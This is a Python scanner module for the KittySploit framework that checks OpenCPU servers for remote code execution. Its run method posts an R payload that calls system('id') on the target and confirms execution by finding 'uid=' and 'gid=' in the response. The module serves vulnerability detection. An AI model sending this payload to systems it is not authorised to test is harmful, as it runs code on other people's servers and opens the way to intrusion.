#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Check for remote code execution via OpenCPU was conducted."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'OpenCPU - Remote Code Execution Detection',
        'description': 'Check for remote code execution via OpenCPU was conducted.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'vulnerability', 'rce', 'opencpu', 'oss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://pulsesecurity.co.nz/articles/R-Shells', 'https://github.com/opencpu/opencpu/'],
    }

    def run(self):
        path = '/ocpu/library/base/R/do.call/json'
        r = self.http_request(method='POST', path=path, allow_redirects=True, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data="what=function(x){  return(system(paste('id'), intern %3d T))}&args={}\n")
        if not r or r.status_code != 201:
            return False
        body = r.text or ""
        body_all = ('uid=', 'gid=',)
        if all(m in body for m in body_all):
            self.set_info(
                severity='critical',
                reason='OpenCPU - Remote Code Execution detected',
                path=path,
            )
            return True
        return False

